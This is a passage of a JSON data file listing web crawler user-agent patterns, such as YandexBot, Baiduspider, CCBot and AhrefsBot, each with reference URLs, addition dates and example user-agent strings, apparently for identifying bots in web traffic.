    "pattern": "buzzbot",
    "instances": [
      "Buzzbot/1.0 (Buzzbot; http://www.buzzstream.com; buzzbot@buzzstream.com)"
    ]
  }
  ,
  {
    "pattern": "mlbot",
    "instances": [
      "MLBot (www.metadatalabs.com/mlbot)"
    ]
  }
  ,
  {
    "pattern": "YandexBot",
    "url": "http://yandex.com/bots",
    "instances": [
      "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2015/04/14"
  }
  ,
  {
    "pattern": "YandexImages",
    "url": "http://yandex.com/bots",
    "instances": [
      "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2015/04/14"
  }
  ,
  {
    "pattern": "YandexAccessibilityBot",
    "url": "http://yandex.com/bots",
    "instances": [
      "Mozilla/5.0 (compatible; YandexAccessibilityBot/3.0; +http://yandex.com/bots"
    ],
    "addition_date": "2019/03/01"
  }
  ,
  {
    "pattern": "YandexMobileBot",
    "url": "https://yandex.com/support/webmaster/robot-workings/check-yandex-robots.xml#robot-in-logs",
    "instances": [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexMobileBot/3.0; +http://yandex.com/bots)"
    ],
    "addition_date": "2016/12/01"
  }
  ,
  {
    "pattern": "purebot",
    "addition_date": "2010/01/19",
    "instances": []
  }
  ,
  {
    "pattern": "Linguee Bot",
    "addition_date": "2010/01/26",
    "url": "http://www.linguee.com/bot",
    "instances": [
      "Linguee Bot (http://www.linguee.com/bot)",
      "Linguee Bot (http://www.linguee.com/bot; bot@linguee.com)"
    ]
  }
  ,
  {
    "pattern": "CyberPatrol",
    "addition_date": "2010/02/11",
    "url": "http://www.cyberpatrol.com/cyberpatrolcrawler.asp",
    "instances": [
      "CyberPatrol SiteCat Webbot (http://www.cyberpatrol.com/cyberpatrolcrawler.asp)"
    ]
  }
  ,
  {
    "pattern": "voilabot",
    "addition_date": "2010/05/18",
    "instances": [
      "Mozilla/5.0 (Windows NT 5.1; U; Win64; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
    ]
  }
  ,
  {
    "pattern": "Baiduspider",
    "addition_date": "2010/07/15",
    "url": "http://www.baidu.jp/spider/",
    "instances": [
      "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
      "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
    ]
  }
  ,
  {
    "pattern": "citeseerxbot",
    "addition_date": "2010/07/17",
    "instances": []
  }
  ,
  {
    "pattern": "spbot",
    "addition_date": "2010/07/31",
    "url": "http://www.seoprofiler.com/bot",
    "instances": [
      "Mozilla/5.0 (compatible; spbot/1.0; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/1.1; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/1.2; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.0.1; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.0.2; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.0.3; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.0.4; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/2.0; +http://www.seoprofiler.com/bot/ )",
      "Mozilla/5.0 (compatible; spbot/2.1; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/3.0; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/3.1; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.1; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.2; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.3; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.4; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.5; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.6; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.7; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.7; +https://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.8; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0.9; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0a; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.0b; +http://www.seoprofiler.com/bot )",
      "Mozilla/5.0 (compatible; spbot/4.1.0; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.2.0; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.3.0; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.4.0; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.4.1; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/5.0.1; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/5.0.2; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/5.0.3; +http://OpenLinkProfiler.org/bot )",
      "Mozilla/5.0 (compatible; spbot/5.0; +http://OpenLinkProfiler.org/bot )"
    ]
  }
  ,
  {
    "pattern": "twengabot",
    "addition_date": "2010/08/03",
    "url": "http://www.twenga.com/bot.html",
    "instances": []
  }
  ,
  {
    "pattern": "postrank",
    "addition_date": "2010/08/03",
    "url": "http://www.postrank.com",
    "instances": [
      "PostRank/2.0 (postrank.com)",
      "PostRank/2.0 (postrank.com; 1 subscribers)"
    ]
  }
  ,
  {
    "pattern": "TurnitinBot",
    "addition_date": "2010/09/26",
    "url": "http://www.turnitin.com",
    "instances": [
      "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
    ]
  }
  ,
  {
    "pattern": "scribdbot",
    "addition_date": "2010/09/28",
    "url": "http://www.scribd.com",
    "instances": []
  }
  ,
  {
    "pattern": "page2rss",
    "addition_date": "2010/10/07",
    "url": "http://www.page2rss.com",
    "instances": [
      "Mozilla/5.0 (compatible;  Page2RSS/0.7; +http://page2rss.com/)"
    ]
  }
  ,
  {
    "pattern": "sitebot",
    "addition_date": "2010/12/15",
    "url": "http://www.sitebot.org",
    "instances": [
      "Mozilla/5.0 (compatible; Whoiswebsitebot/0.1; +http://www.whoiswebsite.net)"
    ]
  }
  ,
  {
    "pattern": "linkdex",
    "addition_date": "2011/01/06",
    "url": "http://www.linkdex.com",
    "instances": [
      "Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/about/bots/)",
      "Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)",
      "Mozilla/5.0 (compatible; linkdexbot/2.1; +http://www.linkdex.com/about/bots/)",
      "Mozilla/5.0 (compatible; linkdexbot/2.1; +http://www.linkdex.com/bots/)",
      "Mozilla/5.0 (compatible; linkdexbot/2.2; +http://www.linkdex.com/bots/)",
      "linkdex.com/v2.0",
      "linkdexbot/Nutch-1.0-dev (http://www.linkdex.com/; crawl at linkdex dot com)"
    ]
  }
  ,
  {
    "pattern": "Adidxbot",
    "url": "http://onlinehelp.microsoft.com/en-us/bing/hh204496.aspx",
    "instances": []
  }
  ,
  {
    "pattern": "ezooms",
    "addition_date": "2011/04/27",
    "url": "http://www.phpbb.com/community/viewtopic.php?f=64&t=935605&start=450#p12948289",
    "instances": [
      "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)"
    ]
  }
  ,
  {
    "pattern": "dotbot",
    "addition_date": "2011/04/27",
    "instances": [
      "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)",
      "dotbot"
    ]
  }
  ,
  {
    "pattern": "Mail.RU_Bot",
    "addition_date": "2011/04/27",
    "instances": [
      "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)",
      "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/",
      "Mozilla/5.0 (compatible; Mail.RU_Bot/2.0; +http://go.mail.ru/",
      "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Robots/2.0; +http://go.mail.ru/help/robots)"
    ]
  }
  ,
  {
    "pattern": "discobot",
    "addition_date": "2011/05/03",
    "url": "http://discoveryengine.com/discobot.html",
    "instances": [
      "Mozilla/5.0 (compatible; discobot/1.0; +http://discoveryengine.com/discobot.html)",
      "Mozilla/5.0 (compatible; discobot/2.0; +http://discoveryengine.com/discobot.html)",
      "mozilla/5.0 (compatible; discobot/1.1; +http://discoveryengine.com/discobot.html)"
    ]
  }
  ,
  {
    "pattern": "heritrix",
    "addition_date": "2011/06/21",
    "url": "https://github.com/internetarchive/heritrix3/wiki",
    "instances": [
      "Mozilla/5.0 (compatible; heritrix/1.12.1 +http://www.webarchiv.cz)",
      "Mozilla/5.0 (compatible; heritrix/1.12.1b +http://netarkivet.dk/website/info.html)",
      "Mozilla/5.0 (compatible; heritrix/1.14.2 +http://rjpower.org)",
      "Mozilla/5.0 (compatible; heritrix/1.14.2 +http://www.webarchiv.cz)",
      "Mozilla/5.0 (compatible; heritrix/1.14.3 +http://archive.org)",
      "Mozilla/5.0 (compatible; heritrix/1.14.3 +http://www.accelobot.com)",
      "Mozilla/5.0 (compatible; heritrix/1.14.3 +http://www.webarchiv.cz)",
      "Mozilla/5.0 (compatible; heritrix/1.14.3.r6601 +http://www.buddybuzz.net/yptrino)",
      "Mozilla/5.0 (compatible; heritrix/1.14.4 +http://parsijoo.ir)",
      "Mozilla/5.0 (compatible; heritrix/1.14.4 +http://www.exif-search.com)",
      "Mozilla/5.0 (compatible; heritrix/2.0.2 +http://aihit.com)",
      "Mozilla/5.0 (compatible; heritrix/2.0.2 +http://seekda.com)",
      "Mozilla/5.0 (compatible; heritrix/3.0.0-SNAPSHOT-20091120.021634 +http://crawler.archive.org)",
      "Mozilla/5.0 (compatible; heritrix/3.1.0-RC1 +http://boston.lti.cs.cmu.edu/crawler_12/)",
      "Mozilla/5.0 (compatible; heritrix/3.1.1 +http://places.tomtom.com/crawlerinfo)",
      "Mozilla/5.0 (compatible; heritrix/3.1.1 +http://www.mixdata.com)",
      "Mozilla/5.0 (compatible; heritrix/3.1.1; UniLeipzigASV +http://corpora.informatik.uni-leipzig.de/crawler_faq.html)",
      "Mozilla/5.0 (compatible; heritrix/3.2.0 +http://www.crim.ca)",
      "Mozilla/5.0 (compatible; heritrix/3.2.0 +http://www.exif-search.com)",
      "Mozilla/5.0 (compatible; heritrix/3.2.0 +http://www.mixdata.com)",
      "Mozilla/5.0 (compatible; heritrix/3.3.0-SNAPSHOT-20160309-0050; UniLeipzigASV +http://corpora.informatik.uni-leipzig.de/crawler_faq.html)",
      "Mozilla/5.0 (compatible; sukibot_heritrix/3.1.1 +http://suki.ling.helsinki.fi/eng/webmasters.html)"
    ]
  }
  ,
  {
    "pattern": "findthatfile",
    "addition_date": "2011/06/21",
    "url": "http://www.findthatfile.com/",
    "instances": []
  }
  ,
  {
    "pattern": "europarchive.org",
    "addition_date": "2011/06/21",
    "url": "",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 7.0 +http://www.europarchive.org)"
    ]
  }
  ,
  {
    "pattern": "NerdByNature.Bot",
    "addition_date": "2011/07/12",
    "url": "http://www.nerdbynature.net/bot",
    "instances": [
      "Mozilla/5.0 (compatible; NerdByNature.Bot; http://www.nerdbynature.net/bot)"
    ]
  }
  ,
  {
    "pattern": "sistrix crawler",
    "addition_date": "2011/08/02",
    "instances": []
  }
  ,
  {
    "pattern": "Ahrefs(Bot|SiteAudit)",
    "addition_date": "2011/08/28",
    "instances": [
      "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsSiteAudit/6.1; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsBot/5.2; News; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsSiteAudit/5.2; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; AhrefsBot/6.1; News; +http://ahrefs.com/robot/)"
    ]
  }
  ,
  {
    "pattern": "fuelbot",
    "addition_date": "2018/06/28",
    "instances": [
      "fuelbot"
    ]
  }
  ,
  {
    "pattern": "CrunchBot",
    "addition_date": "2018/06/28",
    "instances": [
      "CrunchBot/1.0 (+http://www.leadcrunch.com/crunchbot)"
    ]
  }
  ,
  {
    "pattern": "IndeedBot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0 (IndeedBot 1.1)"
    ]
  }
  ,
  {
    "pattern": "mappydata",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; Mappy/1.0; +http://mappydata.net/bot/)"
    ]
  }
  ,
  {
    "pattern": "woobot",
    "addition_date": "2018/06/28",
    "instances": [
      "woobot"
    ]
  }
  ,
  {
    "pattern": "ZoominfoBot",
    "addition_date": "2018/06/28",
    "instances": [
      "ZoominfoBot (zoominfobot at zoominfo dot com)"
    ]
  }
  ,
  {
    "pattern": "PrivacyAwareBot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; PrivacyAwareBot/1.1; +http://www.privacyaware.org)"
    ]
  }
  ,
  {
    "pattern": "Multiviewbot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Multiviewbot"
    ]
  }
  ,
  {
    "pattern": "SWIMGBot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36 SWIMGBot"
    ]
  }
  ,
  {
    "pattern": "Grobbot",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; Grobbot/2.2; +https://grob.it)"
    ]
  }
  ,
  {
    "pattern": "eright",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; eright/1.0; +bot@eright.com)"
    ]
  }
  ,
  {
    "pattern": "Apercite",
    "addition_date": "2018/06/28",
    "instances": [
      "Mozilla/5.0 (compatible; Apercite; +http://www.apercite.fr/robot/index.html)"
    ]
  }
  ,
  {
    "pattern": "semanticbot",
    "addition_date": "2018/06/28",
    "instances": [
      "semanticbot",
      "semanticbot (info@semanticaudience.com)"
    ]
  }
  ,
  {
    "pattern": "Aboundex",
    "addition_date": "2011/09/28",
    "url": "http://www.aboundex.com/crawler/",
    "instances": [
      "Aboundex/0.2 (http://www.aboundex.com/crawler/)",
      "Aboundex/0.3 (http://www.aboundex.com/crawler/)"
    ]
  }
  ,
  {
    "pattern": "domaincrawler",
    "addition_date": "2011/10/21",
    "instances": [
      "CipaCrawler/3.0 (info@domaincrawler.com; http://www.domaincrawler.com/www.example.com)"
    ]
  }
  ,
  {
    "pattern": "wbsearchbot",
    "addition_date": "2011/12/21",
    "url": "http://www.warebay.com/bot.html",
    "instances": []
  }
  ,
  {
    "pattern": "summify",
    "addition_date": "2012/01/04",
    "url": "http://summify.com",
    "instances": [
      "Summify (Summify/1.0.1; +http://summify.com)"
    ]
  }
  ,
  {
    "pattern": "CCBot",
    "addition_date": "2012/02/05",
    "url": "http://www.commoncrawl.org/bot.html",
    "instances": [
      "CCBot/2.0 (http://commoncrawl.org/faq/)",
      "CCBot/2.0 (https://commoncrawl.org/faq/)"
    ]
  }
  ,
  {
    "pattern": "edisterbot",
    "addition_date": "2012/02/25",
    "instances": []
  }
  ,
  {
    "pattern": "seznambot",
    "addition_date": "2012/03/14",
    "instances": [
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test1-1; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test1; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test2; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2-test4; +http://napoveda.seznam.cz/en/seznambot-intro/)",
      "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
    ]
  }
  ,
  {
    "pattern": "ec2linkfinder",
    "addition_date": "2012/03/22",
    "instances": [
      "ec2linkfinder"
    ]
  }
  ,
  {
    "pattern": "gslfbot",
    "addition_date": "2012/04/03",
    "instances": []
  }
  ,
  {
    "pattern": "aiHitBot",
    "addition_date": "2012/04/16",
    "instances": [
      "Mozilla/5.0 (compatible; aiHitBot/2.9; +https://www.aihitdata.com/about)"
    ]
  }
  ,
  {
    "pattern": "intelium_bot",
    "addition_date": "2012/05/07",
    "instances": []
  }
  ,
  {
    "pattern": "facebookexternalhit",
    "addition_date": "2012/05/07",
    "instances": [
      "facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)",
      "facebookexternalhit/1.1",
      "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
    ],
    "url": "https://developers.facebook.com/docs/sharing/webmasters/crawler/"
  }
  ,
  {
    "pattern": "Yeti",
    "addition_date": "2012/05/07",
    "url": "http://naver.me/bot",
    "instances": [
      "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/bot)"
    ]
  }
  ,
  {
    "pattern": "RetrevoPageAnalyzer",
    "addition_date": "2012/05/07",
    "instances": [
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; RetrevoPageAnalyzer; +http://www.retrevo.com/content/about-us)"
    ]
  }
  ,
  {
    "pattern": "lb-spider",
    "addition_date": "2012/05/07",
    "instances": []
  }
  ,
  {
    "pattern": "Sogou",
    "addition_date": "2012/05/13",
    "url": "http://www.sogou.com/docs/help/webmasters.htm#07",
    "instances": [
      "Sogou News Spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
      "Sogou Pic Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
      "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
    ]
  }
  ,
  {
    "pattern": "lssbot",
    "addition_date": "2012/05/15",
    "instances": []
  }
  ,
  {
    "pattern": "careerbot",
    "addition_date": "2012/05/23",
    "url": "http://www.career-x.de/bot.html",
    "instances": []
  }
  ,
  {
    "pattern": "wotbox",
    "addition_date": "2012/06/12",
    "url": "http://www.wotbox.com",
    "instances": [
      "Wotbox/2.0 (bot@wotbox.com; http://www.wotbox.com)",
      "Wotbox/2.01 (+http://www.wotbox.com/bot/)"
    ]
  }
  ,
  {
    "pattern": "wocbot",
    "addition_date": "2012/07/25",
    "url": "http://www.wocodi.com/crawler",
    "instances": []
  }
  ,
  {
    "pattern": "ichiro",
    "addition_date": "2012/08/28",
    "url": "http://help.goo.ne.jp/help/article/1142",
    "instances": [
      "DoCoMo/2.0 P900i(c100;TB;W24H11) (compatible; ichiro/mobile goo; +http://help.goo.ne.jp/help/article/1142/)",
      "DoCoMo/2.0 P900i(c100;TB;W24H11) (compatible; ichiro/mobile goo; +http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "DoCoMo/2.0 P900i(c100;TB;W24H11) (compatible; ichiro/mobile goo;+http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "DoCoMo/2.0 P900i(c100;TB;W24H11)(compatible; ichiro/mobile goo;+http://help.goo.ne.jp/door/crawler.html)",
      "DoCoMo/2.0 P901i(c100;TB;W24H11) (compatible; ichiro/mobile goo; +http://help.goo.ne.jp/door/crawler.html)",
      "KDDI-CA31 UP.Browser/6.2.0.7.3.129 (GUI) MMP/2.0 (compatible; ichiro/mobile goo; +http://help.goo.ne.jp/help/article/1142/)",
      "KDDI-CA31 UP.Browser/6.2.0.7.3.129 (GUI) MMP/2.0 (compatible; ichiro/mobile goo; +http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "KDDI-CA31 UP.Browser/6.2.0.7.3.129 (GUI) MMP/2.0 (compatible; ichiro/mobile goo;+http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "ichiro/2.0 (http://help.goo.ne.jp/door/crawler.html)",
      "ichiro/2.0 (ichiro@nttr.co.jp)",
      "ichiro/3.0 (http://help.goo.ne.jp/door/crawler.html)",
      "ichiro/3.0 (http://help.goo.ne.jp/help/article/1142)",
      "ichiro/3.0 (http://search.goo.ne.jp/option/use/sub4/sub4-1/)",
      "ichiro/4.0 (http://help.goo.ne.jp/door/crawler.html)",
      "ichiro/5.0 (http://help.goo.ne.jp/door/crawler.html)"
    ]
  }
  ,
  {
    "pattern": "DuckDuckBot",
    "addition_date": "2012/09/19",
    "url": "http://duckduckgo.com/duckduckbot.html",
    "instances": [
      "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
      "DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)",
      "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
      "'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'"
    ]
  }
  ,
  {
    "pattern": "lssrocketcrawler",
    "addition_date": "2012/09/24",
    "instances": []
  }
  ,
  {
    "pattern": "drupact",
    "addition_date": "2012/09/27",
    "url": "http://www.arocom.de/drupact",
    "instances": [
      "drupact/0.7; http://www.arocom.de/drupact"
    ]
  }
  ,
  {
    "pattern": "webcompanycrawler",
    "addition_date": "2012/10/03",
    "instances": []
  }
  ,
  {
    "pattern": "acoonbot",
    "addition_date": "2012/10/07",
    "url": "http://www.acoon.de/robot.asp",
    "instances": []
  }
  ,
  {
    "pattern": "openindexspider",
    "addition_date": "2012/10/26",
    "url": "http://www.openindex.io/en/webmasters/spider.html",
    "instances": []
  }
  ,
  {
    "pattern": "gnam gnam spider",
    "addition_date": "2012/10/31",
    "instances": []
  }
  ,
  {
    "pattern": "web-archive-net.com.bot",
    "instances": []
  }
  ,
  {
    "pattern": "backlinkcrawler",
    "addition_date": "2013/01/04",
    "instances": []
  }
  ,
  {
    "pattern": "coccoc",
    "addition_date": "2013/01/04",
    "url": "http://help.coccoc.vn/",
    "instances": [
      "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)",
      "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/searchengine)",
      "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)",
      "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)",
      "Mozilla/5.0 (compatible; image.coccoc/1.0; +http://help.coccoc.com/)",
      "Mozilla/5.0 (compatible; imagecoccoc/1.0; +http://help.coccoc.com/)",
      "Mozilla/5.0 (compatible; imagecoccoc/1.0; +http://help.coccoc.com/searchengine)",
      "coccoc",
      "coccoc/1.0 ()",
      "coccoc/1.0 (http://help.coccoc.com/)",
      "coccoc/1.0 (http://help.coccoc.vn/)"
    ]
  }
  ,
  {
    "pattern": "integromedb",
    "addition_date": "2013/01/10",
    "url": "http://www.integromedb.org/Crawler",
    "instances": [
      "www.integromedb.org/Crawler"
    ]
  }
  ,
  {
    "pattern": "content crawler spider",
    "addition_date": "2013/01/11",
    "instances": []
  }
  ,
  {
    "pattern": "toplistbot",
    "addition_date": "2013/02/05",
    "instances": []
  }
  ,
  {
    "pattern": "it2media-domain-crawler",
    "addition_date": "2013/03/12",
    "instances": [
      "it2media-domain-crawler/1.0 on crawler-prod.it2media.de",
      "it2media-domain-crawler/2.0"
    ]
  }
  ,
  {
    "pattern": "ip-web-crawler.com",
    "addition_date": "2013/03/22",
    "instances": []
  }
  ,
  {
    "pattern": "siteexplorer.info",
    "addition_date": "2013/05/01",
    "instances": [
      "Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)",
      "Mozilla/5.0 (compatible; SiteExplorer/1.1b; +http://siteexplorer.info/Backlink-Checker-Spider/)"
    ]
  }
  ,
  {
    "pattern": "elisabot",
    "addition_date": "2013/06/27",
    "instances": []
  }
  ,
  {
    "pattern": "proximic",
    "addition_date": "2013/09/12",
    "url": "http://www.proximic.com/info/spider.php",
    "instances": [
      "Mozilla/5.0 (compatible; proximic; +http://www.proximic.com)",
      "Mozilla/5.0 (compatible; proximic; +http://www.proximic.com/info/spider.php)"
    ]
  }
  ,
  {
    "pattern": "changedetection",
    "addition_date": "2013/09/13",
    "url": "http://www.changedetection.com/bot.html",
    "instances": [
      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;  http://www.changedetection.com/bot.html )"
    ]
  }
  ,
  {
    "pattern": "arabot",
    "addition_date": "2013/10/09",
    "instances": []
  }
  ,
  {
    "pattern": "WeSEE:Search",
    "addition_date": "2013/11/18",
    "instances": [
      "WeSEE:Search",
      "WeSEE:Search/0.1 (Alpha, http://www.wesee.com/en/support/bot/)"
    ]
  }
  ,
  {
    "pattern": "niki-bot",
    "addition_date": "2014/01/01",
    "instances": []
  }
  ,
  {
    "pattern": "CrystalSemanticsBot",
    "addition_date": "2014/02/17",
    "url": "http://www.crystalsemantics.com/user-agent/",
    "instances": []
  }
  ,
  {
    "pattern": "rogerbot",
    "addition_date": "2014/02/28",
    "url": "http://moz.com/help/pro/what-is-rogerbot-",
    "instances": [
      "Mozilla/5.0 (compatible; rogerBot/1.0; UrlCrawler; http://www.seomoz.org/dp/rogerbot)",
      "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-crawler+partager@moz.com)",
      "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-crawler+shiny@moz.com)",
      "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-wherecat@moz.com",
      "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-wherecat@moz.com)",
      "rogerbot/1.0 (http://www.moz.com/dp/rogerbot, rogerbot-crawler@moz.com)",
      "rogerbot/1.0 (http://www.seomoz.org/dp/rogerbot, rogerbot-crawler+shiny@seomoz.org)",
      "rogerbot/1.0 (http://www.seomoz.org/dp/rogerbot, rogerbot-crawler@seomoz.org)",
      "rogerbot/1.0 (http://www.seomoz.org/dp/rogerbot, rogerbot-wherecat@moz.com)",
      "rogerbot/1.1 (http://moz.com/help/guides/search-overview/crawl-diagnostics#more-help, rogerbot-crawler+pr2-crawler-05@moz.com)",
      "rogerbot/1.1 (http://moz.com/help/guides/search-overview/crawl-diagnostics#more-help, rogerbot-crawler+pr4-crawler-11@moz.com)",
      "rogerbot/1.1 (http://moz.com/help/guides/search-overview/crawl-diagnostics#more-help, rogerbot-crawler+pr4-crawler-15@moz.com)",
      "rogerbot/1.2 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-crawler+phaser-testing-crawler-01@moz.com)"
    ]
  }
  ,
  {
    "pattern": "360Spider",
    "addition_date": "2014/03/14",
    "url": "http://needs-be.blogspot.co.uk/2013/02/how-to-block-spider360.html",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider",
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)",
      "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 QIHU 360SE; 360Spider",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; )  Firefox/1.5.0.11; 360Spider",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11)  Firefox/1.5.0.11; 360Spider",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Firefox/1.5.0.11 360Spider;",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11; 360Spider",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
    ]
  }
  ,
  {
    "pattern": "psbot",
    "addition_date": "2014/03/31",
    "url": "http://www.picsearch.com/bot.html",
    "instances": [
